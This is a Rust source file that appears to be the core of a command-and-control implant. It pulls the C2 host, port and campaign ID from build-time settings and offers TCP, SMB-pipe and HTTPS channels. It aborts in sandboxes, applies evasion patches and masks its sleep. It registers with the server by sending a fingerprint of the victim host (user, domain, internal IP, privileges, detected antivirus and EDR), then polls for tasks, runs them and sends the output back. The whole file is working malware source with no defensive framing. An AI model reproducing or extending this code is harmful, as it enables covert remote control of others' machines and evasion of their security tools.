use std::time::Duration;

pub const C2_HOST:       &str = env!("DM_C2_HOST");
pub const C2_PORT:       &str = env!("DM_C2_PORT");
const PATH_POLL:         &str = env!("DM_C2_PATH_POLL");
const PATH_REGISTER:     &str = env!("DM_C2_PATH_REG");
const CAMPAIGN_ID:       &str = env!("DM_CAMPAIGN_ID");
pub const BUILD_UUID:    &str = env!("DM_BUILD_UUID");
const SLEEP_SECS:    u64  = const_parse_u64(env!("DM_SLEEP_SECS"));
const JITTER_PCT:    u64  = const_parse_u64(env!("DM_JITTER_PCT"));

fn make_channel() -> Box<dyn crate::channel::Channel> {
    #[cfg(feature = "channel-tcp")]
    { return Box::new(crate::channel::tcp::TcpChannel::new(C2_HOST, C2_PORT)); }

    #[cfg(all(feature = "channel-smb", target_os = "windows"))]
    { return Box::new(crate::channel::smb::SmbChannel::new(
        env!("DM_SMB_HOST"), env!("DM_SMB_PIPE"),
    )); }

    Box::new(crate::channel::https::HttpsChannel::new(C2_HOST, C2_PORT))
}

pub struct Session {
    pub id:            String,
    pub server_pubkey: Vec<u8>,
    pub session_key:   [u8; 32],
}

pub fn run() {
    let _ = crate::syscall::init();

    if crate::evasion::abort_if_sandboxed() {
        return;
    }

    let mut ch = make_channel();

    let session = match register(&mut *ch) {
        Ok(s) => s,
        Err(_) => return,
    };

    crate::evasion::startup_patches();

    let mut sleep = SLEEP_SECS;
    let mut jitter = JITTER_PCT;
    let mut session = session;

    loop {
        let actual = compute_sleep_secs(sleep, jitter);
        crate::evasion::masked_sleep(Duration::from_secs(actual), &mut session.session_key);

        if crate::evasion::should_abort() {
            return;
        }

        let poll = match ch.poll(&session, PATH_POLL) {
            Ok(p) => p,
            Err(_) => continue,
        };

        if poll.sleep_seconds > 0 {
            sleep  = poll.sleep_seconds;
            jitter = poll.jitter_pct;
        }

        if poll.kill {
            crate::evasion::cleanup();
            return;
        }

        let mut exit_requested = false;
        for task in poll.tasks {
            let output       = crate::executor::run(&task);
            let should_exit  = output.should_exit;
            let evasion_event = output.evasion_detected;

            let _ = ch.submit_output(
                &session,
                PATH_POLL,
                &task.id,
                output.data,
                output.success,
                evasion_event,
                output.evasion_description.unwrap_or_default(),
            );

            if should_exit {
                exit_requested = true;
                break;
            }
        }

        if exit_requested {
            crate::evasion::cleanup();
            return;
        }
    }
}

fn register(ch: &mut dyn crate::channel::Channel) -> Result<Session, ()> {
    let reg_req = build_registration_request();
    let resp = ch.register(&reg_req, PATH_REGISTER).map_err(|_| ())?;
    let session_key = crate::crypto::derive_session_key(&resp.server_pubkey).map_err(|_| ())?;
    Ok(Session {
        id: resp.session_id,
        server_pubkey: resp.server_pubkey,
        session_key,
    })
}

fn build_registration_request() -> crate::task::RegisterRequest {
    let fp = crate::fingerprint::collect();
    crate::task::RegisterRequest {
        build_id:     BUILD_UUID.to_string(),
        campaign_id:  CAMPAIGN_ID.to_string(),
        hostname:     fp.hostname,
        username:     fp.username,
        domain:       fp.domain,
        ip_internal:  fp.ip_internal,
        os:           fp.os,
        arch:         fp.arch,
        os_version:   fp.os_version,
        is_elevated:  fp.is_elevated,
        process_name: fp.process_name,
        pid:          fp.pid,
        edr_detected: fp.edr_detected,
        av_detected:  fp.av_detected,
        pubkey:       crate::crypto::agent_pubkey_bytes().to_vec(),
    }
}

fn compute_sleep_secs(sleep_secs: u64, jitter_pct: u64) -> u64 {
    let jitter_range = ((sleep_secs * jitter_pct) / 100) as i64;
    let offset: i64 = if jitter_range > 0 {
        let seed = std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .unwrap_or_default()
            .subsec_nanos() as i64;
        (seed % (jitter_range * 2)) - jitter_range
    } else {
        0
    };
    ((sleep_secs as i64) + offset).max(1) as u64
}

const fn const_parse_u64(s: &str) -> u64 {
    let bytes = s.as_bytes();
    let mut result: u64 = 0;
    let mut i = 0;
    while i < bytes.len() {
        result = result * 10 + (bytes[i] - b'0') as u64;
        i += 1;
    }
    result
}
